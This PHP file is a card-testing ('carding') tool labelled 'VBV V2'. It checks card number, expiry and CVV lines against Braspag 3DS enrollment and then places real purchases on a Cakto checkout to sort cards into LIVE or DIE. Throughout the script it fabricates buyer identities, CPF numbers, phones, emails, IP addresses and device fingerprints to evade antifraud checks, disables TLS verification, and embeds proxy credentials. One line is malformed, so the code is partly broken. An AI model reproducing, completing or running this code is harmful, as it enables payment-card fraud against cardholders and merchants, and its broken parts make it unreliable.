<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);
set_time_limit(180);
ob_start();
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

// ==== MODO LITE: sem autenticacao, sem ban por IP, sem deducao de credito, sem notifyLive ====
$pdo = null;
$user_key = 'lite';
function notifyLive(...$a) {}
function gastarCredito(...$a) {}
function validarChave(...$a) { return (object)['expira' => '2099-01-01']; }

register_shutdown_function(function() {
    $err = error_get_last();
    if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        if (!headers_sent()) {
            header('Content-Type: application/json; charset=utf-8');
        }
        ob_clean();
        echo json_encode(['error' => 'FATAL: ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line']]);
    }
});

define('CAKTO_BASE', 'https://api.cakto.com.br');
define('CAKTO_OFFER', 'qe88sjm_951678');
define('CAKTO_CHECKOUT_URL', 'https://pay.cakto.com.br/' . CAKTO_OFFER);
define('CAKTO_DEBUG', __DIR__ . '/private/debug_caktohttp.log');

$CAKTO_STORAGE = __DIR__ . '/private';
if (!is_dir($CAKTO_STORAGE)) @mkdir($CAKTO_STORAGE, 0777, true);
if (!is_writable($CAKTO_STORAGE)) $CAKTO_STORAGE = sys_get_temp_dir() . '/don777';
@mkdir($CAKTO_STORAGE, 0777, true);
define('CAKTO_STORAGE', $CAKTO_STORAGE);
define('CAKTO_DEBUG', CAKTO_STORAGE . '/debug_caktohttp.log');

define('CAKTO_USE_PROXY', false);
$CAKTO_PROXY = 'brd-customer-hl_64e99499-zone-isp_proxy1-country-br-session-' . bin2hex(random_bytes(5)) . ':28mg26w1zt8z@brd.superproxy.io:44445';

function dlog($m) {
    $line = date('H:i:s') . " | $m\n";
    if (@file_put_contents(CAKTO_DEBUG, $line, FILE_APPEND | LOCK_EX) === false) {
        return @file_put_contents(CAKTO_DEBUG, $line, FILE_APPEND) !== false;
    }
    return true;
}

function jsonResp($data, $code = 200) {
    ob_clean();
    http_response_code($code);
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    if (ob_get_level()) ob_end_flush();
    flush();
    die();
}

function curlJson($url, $method = 'GET', $payload = null, $noProxy = false) {
    global $CAKTO_PROXY;
    $ch = curl_init($url);
    $h = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Origin: https://pay.cakto.com.br',
        'Referer: ' . CAKTO_CHECKOUT_URL,
    ];
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $h,
        CURLOPT_TIMEOUT => 25,
        CURLOPT_SSL_VERIFYPEER => false,
    ];
    if (CAKTO_USE_PROXY && !$noProxy) {
        $p = explode('@', $CAKTO_PROXY, 2);
        $opts[CURLOPT_PROXY] = $p[1];
        $opts[CURLOPT_PROXYUSERPWD] = $p[0];
        $opts[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
    }
    if ($method === 'POST') {
        $opts[CURLOPT_POST] = true;
        $opts[CURLOPT_POSTFIELDS] = $payload;
        $h[] = 'Content-Type: application/json';
        $opts[CURLOPT_HTTPHEADER] = $h;
    }
    curl_setopt_array($ch, $opts);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    return ['code' => $code, 'body' => $body, 'err' => $err];
}

function validarLuhn($n) {
    $s = 0; $alt = false;
    for ($i = strlen($n) - 1; $i >= 0; $i--) {
        $d = (int)$n[$i];
        if ($alt) { $d *= 2; if ($d > 9) $d -= 9; }
        $s += $d; $alt = !$alt;
    }
    return $s % 10 === 0;
}

function gerarCPF() {
    $n = [];
    for ($i = 0; $i < 9; $i++) $n[] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $d1 = ($d1 * 10) % 11; if ($d1 >= 10) $d1 = 0;
    $d2 = 0; for ($i = 0; $i < 10; $i++) $d2 += (isset($n[$i]) ? $n[$i] : $d1) * (11 - $i);
    $d2 = ($d2 * 10) % 11; if ($d2 >= 10) $d2 = 0;
    return implode('', $n) . $d1 . $d2;
}

function gerarNome() {
    $n = ['Lucas','Maria','Carlos','Ana','Pedro','Rafael','Gustavo','Felipe','Juliana','Camila','Gabriel','Mariana','Amanda','Bruno','Leonardo','Patricia','Larissa','Diego','Rodrigo','Thiago','Eduardo','Renata','Vanessa','Cristina','Daniel','Marcos','Simone','Alexandre','Priscila','Rogerio','Sandra','Ricardo','Carolina','Andre','Sabrina','Marcelo','Tamires','Leandro','Luciana','Fabricio','Cintia','Wagner','Caio','Leticia'];
    $s = ['Silva','Santos','Oliveira','Souza','Lima','Pereira','Costa','Rodrigues','Almeida','Nascimento','Barbosa','Gomes','Martins','Carvalho','Teixeira','Ribeiro','Araujo','Melo','Cavalcante','Dias','Viana','Moreira','Correia','Nunes','Mendes','Monteiro','Cardoso','Cunha','Freitas','Vieira','Macedo','Ferreira','Batista','Barros','Pinto','Farias','Campos','Neves','Sales','Peixoto'];
    return $n[array_rand($n)] . ' ' . $s[array_rand($s)] . ' ' . $s[array_rand($s)];
}

function gerarTelefone() {
    $ddd = ['11','21','31','41','51','61','71','91','19','27','48','62','85','98'];
    return '55' . $ddd[array_rand($ddd)] . '9' . str_pad((string)rand(10000000, 99999999), 8, '0', STR_PAD_LEFT);
}

function getProduct($offerId) {
    $r = curlJson(CAKTO_BASE . "/api/product/checkout/$offerId/", 'GET', null, true);
    if ($r['code'] !== 200) return null;
    $d = json_decode($r['body'], true);
    if (!is_array($d) || empty($d['product']['short_id']) || empty($d['id'])) return null;
    return ['short_id' => $d['product']['short_id'], 'id' => $d['id'], 'price' => (float)($d['product']['price'] ?? 0)];
}

// --- Fluxo 3DS (Cardinal Commerce / Braspag MPI) ---

function get3dsToken() {
    $cacheFile = CAKTO_STORAGE . '/cakto_3ds_token.json';
    $TTL = 1140; 
    $cached = null;
    if (file_exists($cacheFile)) {
        $j = @json_decode(@file_get_contents($cacheFile), true);
        if (is_array($j) && !empty($j['token']) && isset($j['ts']) && (time() - (int)$j['ts']) < $TTL) {
            $cached = $j['token'];
        }
    }
    if ($cached) return $cached;

    $fp = @fopen($cacheFile, 'c+');
    if ($fp) {
        $locked = @flock($fp, LOCK_EX);
        $j = @json_decode(@file_get_contents($cacheFile), true);
        if (is_array($j) && !empty($j['token']) && isset($j['ts']) && (time() - (int)$j['ts']) < $TTL) {
            $tok = $j['token'];
        } else {
            $tok = null;
            $r = curlJson(CAKTO_BASE . '/api/financial/3ds/token/?provider=cielo', 'GET', null, true);
            if ($r['code'] === 200) {
                $dec = json_decode($r['body'], true);
                if (is_array($dec)) {
                    if (isset($dec['access_token'])) $tok = $dec['access_token'];
                    else {
                        $inner = json_decode(implode('', $dec), true);
                        $tok = is_array($inner) ? ($inner['access_token'] ?? null) : null;
                    }
                }
            }
            if ($tok) {
                ftruncate($fp, 0);
                rewind($fp);
                fwrite($fp, json_encode(['token' => $tok, 'ts' => time()]));
                fflush($fp);
            }
        }
        if ($locked) { @flock($fp, LOCK_UN); }
        fclose($fp);
        if ($tok) return $tok;
    }
    return $cached ?: $tok ?? null;
}

function enrollSpacing() {
    $f = CAKTO_STORAGE . '/cakto_enroll_last.json';
    $INTERVAL = 17;
    $fp = @fopen($f, 'c+');
    if (!$fp) return;
    @flock($fp, LOCK_EX);
    $last = (int)fgets($fp);
    $now = time();
    $wait = $INTERVAL - ($now - $last);
    if ($wait > 0) {
        rewind($fp); ftruncate($fp, 0); fwrite($fp, (string)($now + $wait)); fflush($fp);
        @flock($fp, LOCK_UN); fclose($fp);
        sleep($wait);
        return;
    }
    rewind($fp); ftruncate($fp, 0); fwrite($fp, (string)$now); fflush($fp);
    @flock($fp, LOCK_UN); fclose($fp);
}

function mpiPost($url, $payload, $bearer = null) {
    $h = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'Content-Type: application/json',
        'Accept: application/json',
    ];
    if ($bearer) $h[] = 'Authorization: Bearer ' . $bearer;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_HTTPHEADER => $h,
        CURLOPT_TIMEOUT => 25,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    return ['code' => $code, 'body' => $body, 'err' => $err];
}

function mpiOrder($card, $productId, $amount) {
    return [
        'ordernumber' => $productId,
        'currency' => 'BRL',
        'totalamount' => $amount,
        'paymentmethod' => 'credit',
        'cardnumber' => $card['numero'],
        'cardexpirationmonth' => str_pad($card['mes'], 2, '0', STR_PAD_LEFT),
        'cardexpirationyear' => substr($card['ano'], -4),
        'transactionmode' => 'S',
        'browserInfo' => [
            'userAgent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
            'screenWidth' => 1280, 'screenHeight' => 800, 'colorDepth' => 24,
            'timeZoneOffset' => 180, 'language' => 'pt-BR',
            'javaEnabled' => 'Y', 'javascriptEnabled' => 'Y',
        ],
    ];
}

function verificar3ds($card, $productId, $amount) {
    $tok = get3dsToken();
    if (!$tok) return null;
    enrollSpacing();
    $init = mpiPost('https://mpi.braspag.com.br/v2/3ds/init', [
        'orderNumber' => $productId, 'currency' => 'BRL', 'amount' => $amount,
    ], $tok);
    $dInit = json_decode($init['body'], true);
    if ($init['code'] !== 200 || !is_array($dInit) || empty($dInit['Token'])) return null;

    $order = mpiOrder($card, $productId, $amount);
    $enr = mpiPost('https://mpi.braspag.com.br/v2/3ds/enroll', $order, $tok);
    $tries = 0;
    while (in_array($enr['code'], [429, 500, 502, 503], true) && $tries < 3) {
        sleep(40);
        enrollSpacing();
        $enr = mpiPost('https://mpi.braspag.com.br/v2/3ds/enroll', $order, $tok);
        $tries++;
    }
    $dEnr = json_decode($enr['body'], true);
    if ($enr['code'] !== 200 || !is_array($dEnr)) return null;

    $st = $dEnr['Status'] ?? '';
    $auth = $dEnr['Authentication'] ?? [];

    switch ($st) {
        case 'ENROLLED':
            return ['status' => 'LIVE', 'rc' => 'LIVE', 'msg' => 'LIVE 3DS'];
        case 'AUTHENTICATION_CHECK_NEEDED':
        case 'VALIDATION_NEEDED':
            if (($auth['Status'] ?? '') === 'AUTHENTICATED') {
                return ['status' => 'LIVE', 'rc' => 'LIVE', 'msg' => 'LIVE 3DS'];
            }
            $tid = $dEnr['AuthenticationTransactionId'] ?? null;
            if ($tid) {
                $order['transactionId'] = $tid;
                $val = mpiPost('https://mpi.braspag.com.br/v2/3ds/validate', $order, $tok);
                $dV = json_decode($val['body'], true);
                if (is_array($dV) && (($dV['Status'] ?? '') === 'AUTHENTICATED')) {
                    return ['status' => 'LIVE', 'rc' => 'LIVE', 'msg' => 'LIVE 3DS'];
                }
            }
            return ['status' => 'NOT_PASSED'];
        default:
            return ['status' => 'NOT_PASSED'];
    }
}

function criarVenda($offerId, $shortId, $productId, $card, $installments) {
    sleep(3);
    $nome = $card['nome'];
    $payload = [
        'customer' => [
            'docNumber' => $card['cpf'],
            'email' => strtolower(str_replace(' ', '.', $nome)) . rand(10, 999) . '@gmail.com',
            'fingerprint' => (string)rand(1000000000, 9999999999),
            'docType' => 'cpf',
            'name' => $nome,
            'phone' => $card['telefone'],
        ],
        'paymentMethod' => 'credit_card',
        'items' => [['id' => $productId, 'offerType' => 'main', 'installments' => $installments]],
        'metadata' => [
            'ip' => rand(1, 254) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 254),
            'country' => 'br',
            'sessionid' => substr(md5(uniqid('', true)), 0, 20),
        ],
        'type' => 'product',
        'refererUrl' => '',
        'antifraud_profiling_attempt_reference' => sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            rand(0, 0xffff), rand(0, 0xffff), rand(0, 0xffff), rand(0, 0xffff) | 0x4000,
            rand(0, 0x3fff) | 0x8000, rand(0, 0xffff), rand(0, 0xffff), rand(0, 0xffff)),
        'deviceId' => 'armor.' . bin2hex(random_bytes(40)),
        'card' => [
            'holderName' => strtoupper($nome),
            'number' => $card['numero'],
            'expMonth' => str_pad($card['mes'], 2, '0', STR_PAD_LEFT),
            'expYear' => substr($card['ano'], -2),
            'cvv' => $card['cvv'],
        ],
        'saveCard' => false,
        'checkoutUrl' => CAKTO_CHECKOUT_URL,
    ];
    $json = json_encode($payload, JSON_UNESCAPED_UNICODE);
    $r = curlJson(CAKTO_BASE . "/api/checkout/$shortId/", 'POST', $json);
    return $r;
}

function classificar($resp) {
    $p = $resp['payments'][0] ?? null;
    if (!$p) return ['status' => 'ERROR', 'rc' => 'RC_NA', 'msg' => 'Sem resposta de pagamento'];

    $st = strtolower($p['status'] ?? '');
    $returnCode = (string)($p['return_code'] ?? $p['processor_response_code'] ?? '');
    $reason = strtolower($p['reason'] ?? $p['message'] ?? '');

    // Apenas os 4 retornos especificados (além de approved direto) que saem como LIVE no pós-venda
    $retornosLivePermitidos = ['00', 'N7', '54', '82'];
    $ehSaldoInsuficiente = (strpos($reason, 'saldo insuficiente') !== false || strpos($reason, 'insufficient funds') !== false);

    if ($st === 'approved' || in_array($returnCode, $retornosLivePermitidos, true) || $ehSaldoInsuficiente) {
        $msgLive = 'LIVE ' . ($returnCode ? "($returnCode)" : 'Aprovada');
        if ($ehSaldoInsuficiente) $msgLive = 'LIVE (Saldo Insuficiente)';
        return ['status' => 'LIVE', 'rc' => $returnCode ?: 'LIVE', 'msg' => $msgLive];
    }

    $msgDie = $reason ?: 'Pagamento recusado';
    return ['status' => 'DIE', 'rc' => $returnCode ?: 'DIE', 'msg' => $msgDie . ($returnCode ? " ($returnCode)" : '')];
}

// === MAIN ===
$method = $_SERVER['REQUEST_METHOD'];
$input = $method === 'POST' ? json_decode(file_get_contents('php://input'), true) : $_GET;
$action = $input['action'] ?? '';

try {
switch ($action) {
    case 'testar':
        $cardLine = $input['card'] ?? '';
        if (!$cardLine) jsonResp(['error' => 'card obrigatorio (formato: numero|mes|ano|cvv)'], 400);

        $parts = explode('|', $cardLine);
        if (count($parts) < 4) jsonResp(['error' => 'Formato invalido. Use: numero|mes|ano|cvv'], 400);

        $numero = preg_replace('/\D/', '', $parts[0]);
        if (strlen($numero) !== 16) jsonResp(['error' => 'Cartao deve ter 16 digitos'], 400);
        if (!validarLuhn($numero)) jsonResp(['error' => 'Cartao invalido (Luhn)'], 400);

        $offerId = $input['offer_id'] ?? CAKTO_OFFER;
        $installments = (int)($input['installments'] ?? 1);
        if ($installments < 1) $installments = 1;

        $inicio = microtime(true);
        $prod = getProduct($offerId);
        if (!$prod) jsonResp(['error' => 'Oferta invalida ou indisponivel'], 400);

        $card = [
            'numero' => $numero,
            'mes' => $parts[1],
            'ano' => '20' . substr($parts[2], -2),
            'cvv' => $parts[3],
            'nome' => $input['nome'] ?? gerarNome(),
            'cpf' => preg_replace('/\D/', '', $input['cpf'] ?? '') ?: gerarCPF(),
            'telefone' => gerarTelefone(),
        ];

        // 1ª CHANCE: Tenta a verificação 3DS primeiro
        $amount = (int)round($prod['price'] * 100);
        $mpi = verificar3ds($card, $prod['id'], $amount);
        
        if ($mpi && $mpi['status'] === 'LIVE') {
            dlog("Class: status=LIVE rc=LIVE msg=LIVE 3DS (MPI) card=$numero");
            $result = [
                'card' => $numero,
                'exp' => $parts[1] . substr($parts[2], -2),
                'cvc' => $parts[3],
                'status' => 'LIVE',
                'rc' => 'LIVE',
                'msg' => 'LIVE 3DS',
                'tempo' => round(microtime(true) - $inicio, 2),
            ];
            notifyLive($pdo, $user_key, $numero, substr($numero, 0, 6), 'VBV V2');
            $kd = validarChave($pdo, $user_key);
            if (strtotime($kd->expira ?? '2000-01-01') < time()) gastarCredito($pdo, $user_key, 1);
            jsonResp($result);
        }

        // 2ª CHANCE: Se não passou no 3DS, prossegue para testar a venda e validar se o retorno é N7, 54, 82 ou 00
        $r = criarVenda($offerId, $prod['short_id'], $prod['id'], $card, $installments);

        if ($r['code'] !== 200 || empty($r['body'])) {
            jsonResp(['card' => $numero, 'exp' => $parts[1] . substr($parts[2], -2), 'cvc' => $parts[3],
                'status' => 'ERROR', 'rc' => 'RC_NA', 'msg' => 'HTTP ' . $r['code'] . ' ' . $r['err']]);
        }

        $resp = json_decode($r['body'], true);
        if (!is_array($resp)) {
            jsonResp(['card' => $numero, 'exp' => $parts[1] . substr($parts[2], -2), 'cvc' => $parts[3],
                'status' => 'ERROR', 'rc' => 'RC_NA', 'msg' => 'Resposta invalida']);
        }

        $class = classificar($resp);
        dlog("Class: status={$class['status']} rc={$class['rc']} msg={$class['msg']}");

        $result = $class;
        $result['card'] = $numero;
        $result['exp' => $parts[1] . substr($parts[2], -2);
        $result['cvc'] = $parts[3];
        $result['tempo'] = round(microtime(true) - $inicio, 2);

        $st = $result['status'] ?? '';
        if ($st === 'LIVE') notifyLive($pdo, $user_key, $numero, substr($numero, 0, 6), 'VBV V2');
        $kd = validarChave($pdo, $user_key);
        if (strtotime($kd->expira ?? '2000-01-01') < time()) {
            if ($st === 'LIVE') gastarCredito($pdo, $user_key, 1);
            elseif ($st === 'DIE') gastarCredito($pdo, $user_key, 0.05);
        }
        jsonResp($result);

    case 'validar':
        $numero = preg_replace('/\D/', '', $input['numero'] ?? '');
        jsonResp([
            'numero' => $numero,
            'valido' => $numero ? validarLuhn($numero) : false,
            'tamanho' => strlen($numero)
        ]);
        break;

    case 'debug':
        $lines = (int)($input['lines'] ?? 50);
        $pingOk = dlog('DEBUG ping ' . date('H:i:s'));
        $t0 = microtime(true);
        $net = curlJson(CAKTO_BASE . '/api/product/checkout/' . CAKTO_OFFER . '/', 'GET', null, true);
        $netMs = (int)round((microtime(true) - $t0) * 1000);
        $logFile = file_exists(CAKTO_DEBUG) ? array_slice(file(CAKTO_DEBUG), -$lines) : [];
        $errFile = file_exists(CAKTO_STORAGE . '/erros_caktohttp.log')
            ? array_slice(file(CAKTO_STORAGE . '/erros_caktohttp.log'), -20) : [];
        jsonResp([
            'php' => PHP_VERSION,
            'curl' => function_exists('curl_init'),
            'storage' => CAKTO_STORAGE,
            'storage_writable' => is_writable(CAKTO_STORAGE),
            'private_writable' => is_writable(__DIR__ . '/private'),
            'ping_gravacao' => $pingOk ? 'OK' : 'FALHOU',
            'api_cakto' => [
                'http' => $net['code'],
                'tempo_ms' => $netMs,
                'err' => $net['err'],
                'resposta' => substr($net['body'], 0, 150),
            ],
            'log_linhas' => array_map('trim', $logFile),
            'erros' => array_map('trim', $errFile),
        ]);
        break;

    default:
        jsonResp([
            'api' => 'VBV V2 (HTTP)',
            'acoes' => [
                'testar' => 'POST: card (formato: numero|mes|ano|cvv) + offer_id/installments/nome/cpf (opcionais)',
                'validar' => 'GET/POST: numero'
            ]
        ]);
}
} catch (\Exception $e) {
    $el = date('Y-m-d H:i:s') . " | " . $e->getMessage() . " | " . basename($e->getFile()) . ":" . $e->getLine() . "\n";
    if (@file_put_contents(CAKTO_STORAGE . '/erros_caktohttp.log', $el, FILE_APPEND | LOCK_EX) === false) {
        @file_put_contents(CAKTO_STORAGE . '/erros_caktohttp.log', $el, FILE_APPEND);
    }
    jsonResp(['error' => $e->getMessage()], 500);
}
